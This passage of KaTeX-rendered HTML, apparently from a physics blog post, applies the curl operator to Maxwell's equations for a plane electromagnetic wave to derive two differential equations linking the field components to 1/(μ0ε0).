style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">ϵ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.64333em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal">t</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9663299999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.15216em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5 3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11 10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63 -1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1 -7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59 H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359 c-16-25.333-24-45-24-59z"></path></svg></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.379330000000001em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>

<p>We can apply the formula for curl<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote">1</a></sup> to simplify these down to two differential equations.</p>

<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.24999999999999992em" columnalign="right left right left right left" columnspacing="0em 1em 0em 1em 0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi mathvariant="normal">&#x2207;</mi><mo>&#xd7;</mo><mover accent="true"><mi>E</mi><mo>&#x20d7;</mo></mover></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mn>0</mn><mover accent="true"><mi>x</mi><mo>&#x20d7;</mo></mover><mo>+</mo><mn>0</mn><mover accent="true"><mi>y</mi><mo>&#x20d7;</mo></mover><mo>+</mo><mfrac><mrow><mi mathvariant="normal">&#x2202;</mi><mi>E</mi></mrow><mrow><mi mathvariant="normal">&#x2202;</mi><mi>x</mi></mrow></mfrac><mover accent="true"><mi>z</mi><mo>&#x20d7;</mo></mover><mo>=</mo><mo>&#x2212;</mo><mfrac><mrow><mi mathvariant="normal">&#x2202;</mi><mi>B</mi></mrow><mrow><mi mathvariant="normal">&#x2202;</mi><mi>t</mi></mrow></mfrac><mover accent="true"><mi>z</mi><mo>&#x20d7;</mo></mover></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>&#x27f9;</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>&#x2212;</mo><mfrac><mrow><mi mathvariant="normal">&#x2202;</mi><mi>E</mi></mrow><mrow><mi mathvariant="normal">&#x2202;</mi><mi>B</mi></mrow></mfrac><mo>=</mo><mfrac><mrow><mi mathvariant="normal">&#x2202;</mi><mi>x</mi></mrow><mrow><mi mathvariant="normal">&#x2202;</mi><mi>t</mi></mrow></mfrac></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi mathvariant="normal">&#x2207;</mi><mo>&#xd7;</mo><mover accent="true"><mi>B</mi><mo>&#x20d7;</mo></mover></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mn>0</mn><mover accent="true"><mi>x</mi><mo>&#x20d7;</mo></mover><mo>&#x2212;</mo><mfrac><mrow><mi mathvariant="normal">&#x2202;</mi><mi>B</mi></mrow><mrow><mi mathvariant="normal">&#x2202;</mi><mi>x</mi></mrow></mfrac><mover accent="true"><mi>y</mi><mo>&#x20d7;</mo></mover><mo>+</mo><mn>0</mn><mover accent="true"><mi>z</mi><mo>&#x20d7;</mo></mover><mo>=</mo><msub><mi>&#x3bc;</mi><mn>0</mn></msub><msub><mi>&#x3f5;</mi><mn>0</mn></msub><mfrac><mrow><mi mathvariant="normal">&#x2202;</mi><mi>E</mi></mrow><mrow><mi mathvariant="normal">&#x2202;</mi><mi>t</mi></mrow></mfrac><mover accent="true"><mi>y</mi><mo>&#x20d7;</mo></mover></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>&#x27f9;</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mrow><mo fence="true">(</mo><mo>&#x2212;</mo><mfrac><mrow><mi mathvariant="normal">&#x2202;</mi><mi>E</mi></mrow><mrow><mi mathvariant="normal">&#x2202;</mi><mi>B</mi></mrow></mfrac><mo fence="true">)</mo></mrow><mo>&#x22c5;</mo><mfrac><mrow><mi mathvariant="normal">&#x2202;</mi><mi>x</mi></mrow><mrow><mi mathvariant="normal">&#x2202;</mi><mi>t</mi></mrow></mfrac><mo>=</mo><mfrac><mn>1</mn><mrow><msub><mi>&#x3bc;</mi><mn>0</mn></msub><msub><mi>&#x3f5;</mi><mn>0</mn></msub></mrow></mfrac></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}
	\nabla \times \vec{E} &amp;= 0\vec{x} + 0\vec{y} + \frac{\partial E}{\partial x}\vec{z} = -\frac{\partial B}{\partial t}\vec{z} 
	&amp;&amp;\Longrightarrow&amp;&amp; - \frac{\partial E}{\partial B} = \frac{\partial x}{\partial t}
\\	\nabla \times \vec{B} &amp;= 0\vec{x} - \frac{\partial B}{\partial x}\vec{y} + 0\vec{z} = \mu_0 \epsilon_0 \frac{\partial E}{\partial t}\vec{y}
	&amp;&amp;\Longrightarrow&amp;&amp; \left( - \frac{\partial E}{\partial B} \right) \cdot \frac{\partial x}{\partial t} = \frac{1}{\mu_0 \epsilon_0}
\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:5.05747em;vertical-align:-2.278735em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.778735em;"><span style="top:-4.857295000000001em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"><span class="mord">∇</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9663299999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.15216em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5 3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11 10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63 -1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1 -7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59 H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359 c-16-25.333-24-45-24-59z"></path></svg></span></span></span></span></span></span></span></span></span><span style="top:-2.421295em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"><span class="mord">∇</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9663299999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.15216em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5 3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11 10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63 -1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1 -7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59 H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359 c-16-25.333-24-45-24-59z"></path></svg></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.278735em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.778735em;"><span style="top:-4.857295000000001em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.20772em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5 3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11 10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63 -1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1 -7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59 H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359 c-16-25.333-24-45-24-59z"></path></svg></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">0</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.17994em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5 3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11 10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63 -1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1 -7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59 H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359 c-16-25.333-24-45-24-59z"></path></svg></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.37144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal">x</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.17994em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5 3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11 10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63 -1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1 -7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59 H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359 c-16-25.333-24-45-24-59z"></path></svg></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.37144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal">t</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.17994em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5 3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11 10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63 -1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1 -7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59 H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359 c-16-25.333-24-45-24-59z"></path></svg></span></span></span></span></span></span></span></span></span><span style="top:-2.421295em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.20772em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5 3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11 10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63 -1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1 -7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59 H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359 c-16-25.333-24-45-24-59z"></path></svg></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.37144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal">x</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.17994em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5 3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11 10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63 -1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1 -7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59 H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359 c-16-25.333-24-45-24-59z"></path></svg></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">0</span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.17994em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5 3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11 10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63 -1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1 -7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59 H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359 c-16-25.333-24-45-24-59z"></path></svg></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">μ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">ϵ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.37144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal">t</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.17994em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5 3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11 10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63 -1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1 -7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59 H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359 c-16-25.333-24-45-24-59z"></path></svg></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.278735em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.778735em;"><span style="top:-4.857295000000001em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"></span></span><span style="top:-2.421295em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.278735em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.778735em;"><span style="top:-4.857295000000001em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⟹</span></span></span><span style="top:-2.421295em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⟹</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.278735em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.778735em;"><span style="top:-4.857295000000001em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"></span></span><span style="top:-2.421295em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.278735em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.778735em;"><span style="top:-4.857295000000001em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.37144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.37144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" 